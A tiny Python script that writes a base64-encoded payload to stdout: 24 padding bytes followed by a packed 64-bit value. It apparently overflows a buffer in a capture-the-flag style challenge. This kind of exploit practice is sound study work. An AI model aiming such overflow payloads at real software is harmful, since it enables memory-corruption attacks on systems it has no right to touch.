
import sys
import struct
import base64

buf = b'yyyyyyyyyyyyyyyyyyyyyyyy'
buf += struct.pack('<Q', 5955006606134418232)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
